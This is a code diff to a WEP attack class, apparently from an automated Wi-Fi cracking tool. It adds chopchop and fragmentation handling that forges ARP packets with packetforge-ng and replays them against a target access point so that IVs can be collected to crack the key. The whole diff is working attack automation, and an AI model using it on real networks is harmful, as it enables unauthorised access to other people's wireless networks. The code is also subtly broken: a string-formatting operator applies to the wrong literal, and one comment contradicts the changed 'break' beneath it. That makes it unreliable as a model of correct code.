@@ -47,7 +47,7 @@ class AttackWEP(Attack):
                 # There are no associated clients. Warn user.
                 Color.pl('{!} {O}there are no associated clients{W}')
                 Color.pl('{!} {R}WARNING: {O}many attacks will not succeed' +
-                         '  without fake-authentication or associated clients{W}')
+                         ' without fake-authentication or associated clients{W}')
                 client_mac = None
             else:
                 client_mac = airodump_target.clients[0].station
@@ -58,10 +58,12 @@ class AttackWEP(Attack):
                 # Convert to WEPAttackType.
                 wep_attack_type = WEPAttackType(attack_name)
 
+                replay_file = None
                 # Start Aireplay process.
                 aireplay = Aireplay(self.target, \
                                     wep_attack_type, \
-                                    client_mac=client_mac)
+                                    client_mac=client_mac, \
+                                    replay_file=replay_file)
 
                 time_unchanged_ivs = time.time() # Timestamp when IVs last changed
                 previous_ivs = 0
@@ -126,30 +128,54 @@ class AttackWEP(Attack):
                     if not aireplay.is_running():
                         # Some Aireplay attacks loop infinitely
                         if attack_name == 'chopchop' or attack_name == 'fragment':
-                            # We expect these to stop once a .xor is created
+                            # We expect these to stop once a .xor is created,
                             #    or if the process failed.
 
-                            # TODO: Check for .xor file.
-                            # If .xor is not there, the process failed. Check stdout.
-                            # XXX: For debugging
-                            Color.pl('\n%s stopped, output:' % attack_name)
-                            Color.pl(aireplay.get_output())
-                            continue # Continue to other attacks
+                            replay_file = None
 
-                            # TODO: If .xor exists, run packetforge-ng to create .cap
-                            # If packetforge created the replay .cap file,
-                            #   1. Change attack_name to 'forged arp replay'
-                            #   2. Start Aireplay to replay the .cap file
+                            # Check for .xor file.
+                            xor_file = Aireplay.get_xor()
+                            if not xor_file:
+                                # If .xor is not there, the process failed.
+                                Color.pl('\n{!} {O}%s attack{R} did not generate' +
+                                         ' a .xor file{W}' % attack_name)
+                                # XXX: For debugging
+                                Color.pl('\noutput:\n')
+                                Color.pl(aireplay.get_output())
+                                Color.pl('')
+                                break
+
+                            # If .xor exists, run packetforge-ng to create .cap
+                            Color.pl('\n{+} {C}%s attack{W}' % attack_name +
+                                    ' generated a {C}.xor file{W}, {G}forging...{W}')
+                            forge_file = Aireplay.forge_packet(xor_file,
+                                                               airodump_target.bssid,
+                                                               client_mac)
+                            if forge_file:
+                                replay_file = forge_file
+                                Color.pl('{+} {C}forged packet{W},' +
+                                         ' {G}replaying...{W}')
+                                attack_name = 'forged arp replay'
+                                aireplay = Aireplay(self.target, \
+                                                    'forgedreplay', \
+                                                    client_mac=client_mac, \
+                                                    replay_file=replay_file)
+                                continue
+                            else:
+                                # Failed to forge packet. drop out
+                                break
                         else:
                             Color.pl('\n{!} {O}aireplay-ng exited unexpectedly{W}')
                             Color.pl('\naireplay.get_output():')
                             Color.pl(aireplay.get_output())
-                            continue # Continue to other attacks
+                            break # Continue to other attacks
 
                     # Check if IVs stopped flowing (same for > N seconds)
                     if airodump_target.ivs > previous_ivs:
                         time_unchanged_ivs = time.time()
-                    elif Configuration.wep_restart_stale_ivs > 0:
+                    elif Configuration.wep_restart_stale_ivs > 0 and \
+                         attack_name != 'chopchop' and \
+                         attack_name != 'fragment':
                         stale_seconds = time.time() - time_unchanged_ivs
                         if stale_seconds > Configuration.wep_restart_stale_ivs:
                             # No new IVs within threshold, restart aireplay
